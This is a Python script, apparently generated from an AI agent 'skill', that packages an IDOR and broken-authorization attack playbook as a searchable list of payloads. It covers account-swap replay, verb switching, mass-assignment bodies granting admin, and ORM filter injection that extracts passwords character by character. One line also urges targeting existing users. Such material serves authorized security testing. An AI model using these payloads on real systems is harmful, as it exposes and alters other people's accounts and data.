#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/idor-broken-object-authorization

Skill: SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-idor-broken-object-authorization.py --help
      python hack-skills-idor-broken-object-authorization.py --list
      python hack-skills-idor-broken-object-authorization.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/idor-broken-object-authorization'
TITLE = 'SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: idor-broken-object-authorization", "description: >-", "IDOR and broken object authorization testing playbook. Use when requests expose object identifiers, tenant boundaries, writable fields, or missing object-level authorization checks."],
    'skill-idor-broken-object-level-authorization-expert-attack-playbook': [],
    '1-idor-vs-bola-vs-bfla': ["**Key distinction**:", "- BOLA = accessing **object** you shouldn't own (data belonging to other users)", "- BFLA = accessing **function** you shouldn't be authorized for (admin CRUD operations, bulk actions, user management)"],
    '2-where-to-find-object-ids-all-locations': ["Don't stop at URL path parameters \u2014 IDs appear in:", "URL path:        GET /api/v1/users/1234/profile", "URL query:       GET /orders?order_id=982", "Request body:    {\"userId\": 1234, \"action\": \"view\"}", "JSON fields:     {\"resource\": {\"id\": 5678, \"type\": \"invoice\"}}", "Headers:         X-User-ID: 1234", "X-Account-ID: 9999", "Cookies:         user_id=1234; account=org_5678", "GraphQL args:    query { user(id: \"1234\") { ... } }", "Form fields:     <input name=\"documentId\" value=\"5678\">", "WebSocket msgs:  {\"event\":\"subscribe\",\"channel_id\":9999}"],
    '3-a-b-testing-methodology': ["The most systematic IDOR test approach:", "Step 1: Create two test accounts: UserA and UserB", "Step 2: Perform all actions as UserA, capture all requests", "(profile edit, order view, password change, file access, etc.)", "Step 3: Note every object ID created or accessed by UserA", "Step 4: Authenticate as UserB", "Step 5: Replay UserA's requests using UserB's session token", "Step 6: If UserB can read/modify UserA's data \u2192 BOLA confirmed", "Victim matters: for real bugs, target existing users, not test accounts.", "Report evidence: show UserA owns the resource, UserB accessed it."],
    '4-id-type-its-implications': [],
    '5-horizontal-vs-vertical-privilege-escalation': ["**Horizontal**: UserA accesses UserB's data (same privilege level)", "GET /api/account/1234/statement     \u2190 you are user 5678", "**Vertical**: Low-priv user accesses admin-only functions", "POST /api/admin/users/delete        \u2190 normal user calling admin endpoint", "GET /api/admin/all-users", "PUT /api/users/1234/role {\"role\":\"admin\"}", "**Combined**: Low-priv IDOR that grants privilege escalation", "GET /api/v1/users/1/details \u2192 read admin user's auth token"],
    '6-http-method-escalation': ["When `GET /resource/1234` is properly restricted, test ALL other verbs:", "```http", "GET    /api/v1/users/UserA_ID    \u2190 might be blocked", "POST   /api/v1/users/UserA_ID    \u2190 different code path, might not check authz", "PUT    /api/v1/users/UserA_ID    \u2190 update another user's data", "DELETE /api/v1/users/UserA_ID    \u2190 delete another user's account", "PATCH  /api/v1/users/UserA_ID    \u2190 partial update (often missed in authz checks)", "**Why this works**: Authorization logic is often implemented per-method, and developers forget edge cases."],
    '7-parameter-pollution-type-confusion': ["When `id=1234` is validated, try:", "id[]=1234&id[]=5678          \u2190 array \u2014 app may use first or last", "id=5678&id=1234              \u2190 duplicate \u2014 app may prefer first or last", "{\"id\": \"1234\"}               \u2190 string vs int: might hit different code path", "{\"id\": [1234]}               \u2190 array in JSON", "{\"userId\": 1234, \"id\": 5678} \u2190 two ID fields \u2014 which is used for authz?", "**JSON Type Confusion**:", "```json", "{\"userId\": \"1234\"}   vs   {\"userId\": 1234}", "Some ORMs handle string vs integer differently in queries."],
    '8-bfla-function-level-attacks': [],
    'common-bfla-endpoints-to-test': ["```http"],
    'user-management-admin-only-in-design': ["GET /api/v1/admin/users", "DELETE /api/v1/users/{any_user_id}", "PUT /api/v1/users/{user_id}/role"],
    'bulk-operations': ["POST /api/v1/users/bulk-delete", "GET /api/v1/export/all-data"],
    'billing-payment-admin': ["POST /api/v1/admin/subscription/modify", "GET /api/v1/admin/payments/all"],
    'internal-reporting': ["GET /api/v1/reports/all-users-activity"],
    'how-to-find-hidden-admin-endpoints': ["1. Read JS bundles \u2014 admin routes often exposed in frontend code", "2. Look at API docs (Swagger/OpenAPI) for \"admin\", \"internal\", \"privileged\" tags", "3. Enumerate `/api/v1/admin/**`, `/api/v1/manage/**`, `/api/v1/internal/**`", "4. Burp \"Discover Content\" on API base path", "5. Compare regular user docs vs admin section docs if available"],
    '9-indirect-idor-reference-chain': ["App checks permission on **object A** but doesn't check ownership of **referenced object B**:", "**Example**:", "UserA has permission to read their own messages.", "GET /api/messages/1234 \u2192 checks: \"does user own message 1234?\" \u2713", "But: messages have attachments.", "GET /api/attachments/5678 \u2192 doesn't check: \"does attachment belong to message owned by user?\"", "Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.", "**GraphQL variant**: Inline querying related objects without separate authorization:", "```graphql", "query {", "myProfile {", "followers {", "privateEmail    \u2190 accessing private field of OTHER users via relationship"],
    '10-mass-assignment-privilege-escalation': ["When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:", "```json", "POST /api/v1/register", "\"username\": \"attacker\",", "\"email\": \"a@evil.com\",", "\"password\": \"password\",", "\"role\": \"admin\",          \u2190 hidden field", "\"isAdmin\": true,          \u2190 hidden field", "\"verified\": true,         \u2190 skip email verification", "\"creditBalance\": 9999     \u2190 give self credits", "**How to find hidden fields**:", "1. Intercept admin \"create user\" vs normal \"register\" \u2014 diff the fields", "2. Read API documentation for all possible fields", "3. Check source code if available (GitHub, JS bundles)", "4. Fuzz with Burp: add common property names and check for `200` vs `400`"],
    '11-state-machine-abuse-business-logic-idor': ["When resources have a status/state:", "order.status: pending \u2192 confirmed \u2192 shipped \u2192 delivered", "Test: Can you skip states?", "PUT /api/orders/1234 {\"status\": \"delivered\"}  \u2190 from \"pending\"", "PUT /api/orders/1234 {\"status\": \"refunded\"}   \u2190 from \"pending\" (skip shipped)", "Can you set another user's order status?", "PUT /api/orders/UserA_order_id {\"status\": \"cancelled\"}  \u2190 as UserB"],
    '12-quick-idor-checklist': ["\u25a1 Create 2 accounts (UserA + UserB)", "\u25a1 Map all API calls that contain object IDs (Burp History export filter)", "\u25a1 Test all HTTP verbs on each endpoint", "\u25a1 Test ID in all locations: path, body, header, query, cookie", "\u25a1 Try sequential IDs (\u22121, +1 from your own)", "\u25a1 Try UUIDs/GUIDs collected from your own account data", "\u25a1 Test sub-resources (attachments, comments, transactions)", "\u25a1 Test admin endpoints directly (BFLA)", "\u25a1 Test POST/PUT body for extra fields (mass assignment)", "\u25a1 Compare JSON response field count vs documented fields (hidden fields)", "\u25a1 Test state/status field modification"],
    '13-systematic-idor-testing-8-categories': [],
    'testing-flow': ["1. Create two test accounts (A and B)", "2. Perform all CRUD operations as A, capture all request IDs", "3. Replay each request replacing A's IDs with B's IDs", "4. Check: Can A read B's data? Modify? Delete?", "5. Test with: numeric IDs, UUIDs, slugs, encoded values", "6. Test across: URL path, query params, JSON body, headers"],
    '14-orm-filter-chain-leaks': [],
    'django-orm-filter-injection': ["```python"],
    'vulnerable-user-objects-filter-request-data': [],
    'attacker-sends-password-startswith-a': [],
    'django-translates-to-where-password-like-a': [],
    'character-by-character-extraction': ["POST /api/users/", "{\"username\": \"admin\", \"password__startswith\": \"a\"}   \u2192 200 (match)", "{\"username\": \"admin\", \"password__startswith\": \"b\"}   \u2192 404 (no match)"],
    'iterate-through-charset-for-each-position': [],
    'relational-traversal': ["{\"author__user__password__startswith\": \"a\"}"],
    'traverses-author-user-password-field': [],
    'on-mysql-redos-via-regex': ["{\"email__regex\": \"^(a+)+$\"}  \u2192 CPU spike if match exists"],
    'prisma-filter-injection': ["```json", "// Vulnerable: prisma.user.findMany({ where: req.body })", "// Attacker sends nested include/select:", "\"include\": {", "\"posts\": {", "\"include\": {", "\"author\": {", "\"select\": {\"password\": true}", "// Leaks password field through relation traversal"],
    'ransack-ruby-on-rails': [],
    'ransack-allows-search-predicates-via-query-params': ["GET /users?q[password_cont]=admin"],
    'searches-where-password-like-admin': [],
    'character-extraction': ["GET /users?q[password_start]=a   \u2192 count results", "GET /users?q[password_start]=ab  \u2192 narrow down"],
    'tool-plormber-automated-ransack-extraction': [],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()